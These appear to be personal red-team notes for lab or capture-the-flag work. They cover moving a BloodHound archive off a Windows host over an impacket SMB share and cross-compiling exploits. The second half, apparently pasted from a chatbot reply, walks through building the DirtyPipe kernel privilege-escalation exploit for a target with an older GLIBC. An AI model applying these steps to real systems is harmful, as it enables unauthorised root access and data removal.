https://github.com/0xJs/RedTeaming_CheatSheet/tree/main

SSH key restructure:
```
`cat ~/.ssh/weirdpemkey | sed 's/\\n/\'$'\n/g'`
```

Quickly send over files from Windows:
`impacket-smbserver share $(pwd) -smb2support`
`copy C:\temp\20250422101050_BloodHound.zip \\10.10.16.7\share`


### GCC Error: 
./exploit-2: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit-2)
```
sudo apt install gcc-multilib
Then compile the exploit with gcc -m32 exploit.c -o exp
```

Compiling .exe from linux | compile .sln
```
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
dotnet build file.sln
```


### System Info Recap

- **Kernel**: `5.10.0-18-amd64` (✅ vulnerable to DirtyPipe if unpatched!)
- **GLIBC**: `2.31` (from Debian Bullseye)
- **Architecture**: `x86_64`
- **No Internet** & **No GCC** on target

---

### 🧨 Why Your Exploit Fails

The DirtyPipe binary you tried requires `GLIBC_2.34`, but your system has only `2.31`. That mismatch is fatal for dynamically linked binaries.

---

### ✅ What You Need to Do

You need to **compile the DirtyPipe exploit on another machine** that:

- Has GCC.
- Has **GLIBC 2.31 or older** (or can be made to compile statically).
- Can transfer the binary back to the target system.

---

### 🛠 Step-by-Step Fix (on another machine)

Assuming you have access to a Linux box with internet and GCC:

#### 1. **Get a DirtyPipe PoC (working with 5.10)**

Here's a solid one from Alexis:
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
```
#### 2. **Compile for your target**

Since your target uses GLIBC 2.31, we need to build **on a system that also has 2.31** (or statically compile it).

If you have Docker, you can do it easily:
```
docker run --rm -it -v "$PWD:/src" debian:bullseye bash
```

Inside the contianer:
```
apt update && apt install -y gcc make
cd /src
gcc exploit.c -o exploit-bullseye
exit
```
